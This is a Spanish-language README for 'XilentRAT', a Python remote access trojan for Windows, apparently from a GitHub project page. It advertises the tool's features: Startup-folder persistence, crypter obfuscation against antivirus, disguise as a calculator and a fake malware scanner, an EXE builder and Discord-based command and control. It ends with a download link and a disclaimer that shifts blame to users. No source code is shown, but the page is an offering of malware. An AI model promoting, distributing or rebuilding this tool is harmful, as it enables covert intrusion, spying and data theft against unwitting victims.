<p align="center">
  <img src="https://github.com/user-attachments/assets/9853cdc4-1220-4544-a6a1-fa3443b7cfc8" alt="Purge Logo" Logo" />
</p>

<p align="center">
    <a href="https://python.org">
    <img src="https://img.shields.io/badge/Python-3-green.svg">
  </a>
    <img src="https://img.shields.io/badge/Release-1.2-blue.svg">
  </a>
    <img src="https://img.shields.io/badge/Private-%F0%9F%94%92-red.svg">
  </a>
</p>

<h1 align="center"></h1>

### Acerca de XilentRAT

Xilent es un RAT (_Troyano de Acceso Remoto_) desarrollado en código Python puro para sistemas Windows. Un RAT es un tipo de malware programado para otorgar acceso y control remoto no autorizado a un sistema infectado, permitiendo al atacante realizar diversas acciones maliciosas, como espiar, robar información sensible y ejecutar comandos remotamente.

El proyecto es de uso **privado** y fue creado con el objetivo de desarrollar un RAT de alto nivel utilizando Python, sin ningún fin malicioso ni de causar daño, sino con fines de investigación.

**Testeado en:** Windows 10/11.

<h1 align="center"></h1>

### Características de Xilent `1.2`:

- [x] **Enmascaramiento:** Se diseñó un escáner de malware falso con el fin de permitir que el RAT tenga suficiente tiempo para descargarse en la máquina infectada.
      ![FakeScanner](https://github.com/user-attachments/assets/f4ae453d-8636-42f1-8366-d95d48b67b96)

- [x] **Comandos:** Se añadieron nuevos comandos remotos en el C&C:
      ![lista_comandos2](https://github.com/user-attachments/assets/acb1c69f-755c-454a-96d5-f0a3711e0792)


<h1 align="center"></h1>

### Características de Xilent `1.0`:

- [x] **Persistencia:** El RAT se descarga en la ruta `AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`, lo que permite que se ejecute automáticamente cada vez que el sistema se reinicie.

- [x] **Indetectable:**  El código fuente fue pasado por un crypter antes de empaquetar, indetectable en varios AntiVirus.

- [x] **Enmascaramiento:** Para evitar ser detectado por el usuario, el RAT se oculta como una calculadora inofensiva, mientras en segundo plano se descarga el malware.

- [x] **Builder:** Cuenta con un builder para empaquetar el source code a un .EXE de forma automatizada.

- [x] **C&C:** Xilent incorpora un comando y control a través de un servidor de discord personalizado para que el atacante interactue con el sistema infectado. Entre los comandos para enviar y recibir se encuentran:
      ![lista_comandos](https://github.com/user-attachments/assets/dbfd49aa-d1c7-4085-8ba8-a85fa85e812b)

<h1 align="center"></h1>

#### Demostración de algunos comandos:

![9](https://github.com/user-attachments/assets/f762dcdd-0969-4b73-a632-5d4e6c72183a)

![8](https://github.com/user-attachments/assets/2e39b977-0f4e-46eb-a4d7-f6d56a865d9b)

![7](https://github.com/user-attachments/assets/192182ca-5950-4494-aab2-1b815f41a05e)

![6](https://github.com/user-attachments/assets/e8e2b729-bee8-4442-8dac-d25cdf39cfbc)

![5](https://github.com/user-attachments/assets/a5f1f0e1-381b-4a72-823a-cd048d7574b6)

![4](https://github.com/user-attachments/assets/0f02567c-2a3f-45fd-9550-0f5f1c172e91)

![3](https://github.com/user-attachments/assets/dce0bde9-8798-4294-ba84-37fac5cf0e69)

![2](https://github.com/user-attachments/assets/002cf1d2-d537-4d4f-9b68-55b1b4b33b22)

![1](https://github.com/user-attachments/assets/d52ca728-cb86-40d7-b00c-92b58ff3b6f1)

![10](https://github.com/user-attachments/assets/d0226979-7206-49c5-9d44-18fe5582a33f)


<h1 align="center"></h1>

> [!CAUTION]
> Al utilizar este software, usted acepta los términos y condiciones establecidos. En consecuencia, cualquier uso indebido de este software será de exclusiva responsabilidad del usuario final, y no del autor. Este proyecto tiene como objetivo inicial demostrar las capacidades de Python como herramienta para el desarrollo de malware en entornos controlados. 

⬇️ **Download:** https://anonymfile.com/RYyxK/xilent.zip

<h1 align="center"></h1>

#### Developer: ~R3LI4NT~
